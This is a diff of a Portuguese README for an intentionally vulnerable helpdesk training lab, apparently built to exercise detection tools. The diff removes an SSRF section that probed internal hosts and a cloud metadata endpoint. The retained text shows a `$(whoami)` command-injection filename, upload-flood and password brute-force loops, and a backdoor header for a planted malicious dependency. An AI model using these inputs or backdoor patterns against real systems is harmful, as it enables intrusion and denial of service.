@@ -77,8 +77,7 @@ via IDOR (ver abaixo).
   comenta, edita perfil.
 - **Agente**: fila de chamados atribuídos, responde, muda status/prioridade,
   comentário interno (não visível ao cliente).
-- **Admin**: gestão de usuários, dashboard global, exportar relatório/PDF,
-  "verificar status do ambiente".
+- **Admin**: gestão de usuários, dashboard global, exportar relatório/PDF.
 
 Login/logout sem MFA para todos os papéis.
 
@@ -173,35 +172,7 @@ curl "http://localhost:3001/api/chamados/1/pdf?nome=\$(whoami).pdf" \
   -H "Authorization: Bearer $TOKEN"
 ```
 
-### 6. SSRF via bypass de `baseURL` — `GET /api/admin/kb?ref=`
-
-A "consulta à base de conhecimento interna" usa
-`axios.create({ baseURL: 'http://kb-interna' })` e repassa o parâmetro `ref`
-direto pro `axios.get(ref)`. Em uso normal, `ref` é um path relativo
-(`/artigos/1.json`) e retorna um artigo da KB interna (container
-`kb-interna`, sem porta publicada — só alcançável a partir do backend). Um
-`ref` **protocol-relative** explora o CVE-2024-39338 do axios 1.7.3 fixado no
-projeto: versões ≤1.7.3 resolvem `//host` como URL absoluta, ignorando o
-`baseURL` e escapando para o host informado pelo atacante.
-
-```bash
-# Uso normal: artigo da KB interna
-curl --get "http://localhost:3001/api/admin/kb" \
-  --data-urlencode "ref=/artigos/1.json" \
-  -H "Authorization: Bearer $TOKEN"
-
-# SSRF: bypass do baseURL — sonda rede interna que não deveria ser alcançável
-curl --get "http://localhost:3001/api/admin/kb" \
-  --data-urlencode "ref=//192.168.1.1:22" \
-  -H "Authorization: Bearer $TOKEN"
-
-# SSRF contra metadata endpoint (se rodando em nuvem)
-curl --get "http://localhost:3001/api/admin/kb" \
-  --data-urlencode "ref=//169.254.169.254/latest/meta-data/" \
-  -H "Authorization: Bearer $TOKEN"
-```
-
-### 7. Upload sem limites — `POST /api/chamados/:id/anexos` (multer 1.4.4-2.0.1 / CVE-2025-47944)
+### 6. Upload sem limites — `POST /api/chamados/:id/anexos` (multer 1.4.4-2.0.1 / CVE-2025-47944)
 
 Não há limite de tamanho/quantidade de arquivo configurado no multer,
 permitindo esgotamento de disco/memória (DoS) com uploads grandes ou repetidos.
@@ -215,7 +186,7 @@ for i in $(seq 1 50); do
 done
 ```
 
-### 8. Autenticação fraca
+### 7. Autenticação fraca
 
 - **Hash de senha**: MD5 sem salt (`backend/src/auth.js`) — trivialmente
   quebrável por rainbow table/força bruta (`admin123`, `agente123`,
@@ -235,7 +206,7 @@ for senha in 123456 admin123 senha123 aurora2024; do
 done
 ```
 
-### 9. Dependência maliciosa (slopsquatting) — backdoor de autenticação
+### 8. Dependência maliciosa (slopsquatting) — backdoor de autenticação
 
 O backend usa um pacote local `express-audit-log` (vendorizado em
 `backend/vendor/express-audit-log/`, nome plausível de um "pacote de
@@ -255,7 +226,7 @@ curl -i "http://localhost:3001/api/usuarios"
 curl -i "http://localhost:3001/api/usuarios" -H "X-Debug: trace-9f2c"
 ```
 
-Diferente das 4 dependências da tabela abaixo, este pacote **não tem CVE
+Diferente das 3 dependências da tabela abaixo, este pacote **não tem CVE
 público** — o Trivy/SCA não tem base pra correlacionar e não o detecta. Só é
 interceptado em runtime: Wazuh (processo com conexão de saída anômala no
 startup, FIM sobre `node_modules`/`vendor`) e Suricata (tráfego C2 de saída).
@@ -266,7 +237,6 @@ startup, FIM sobre `node_modules`/`vendor`) e Suricata (tráfego C2 de saída).
 |---|---|---|---|
 | jsonwebtoken | ≤ 8.5.1 | CVE-2022-23539 / 23540 / 23541 | CWE-287 (auth bypass) |
 | express | 4.19.1 (< 4.19.2) | CVE-2024-29041 | CWE-601 (open redirect) |
-| axios | 1.3.2 – 1.7.3 | CVE-2024-39338 | CWE-918 (SSRF) |
 | multer | 1.4.4-lts.1 – 2.0.1 | CVE-2025-7338 (+2026-2359/3304/3520) | CWE-248 (DoS) |
 
 Essas versões estão **fixadas de propósito** em `backend/package.json` — não
@@ -288,7 +258,7 @@ dependência fixada acima antes de escolher qual CVE explorar:
 curl "http://localhost:3001/api/version"
 ```
 
-> O pacote `express-audit-log` (item 9 acima) não aparece nesta tabela de
+> O pacote `express-audit-log` (item 8 acima) não aparece nesta tabela de
 > propósito: é uma dependência maliciosa sem CVE público, usada para
 > demonstrar o limite da SCA — o Trivy detecta CVE conhecido, não um
 > backdoor novo sem advisory público.
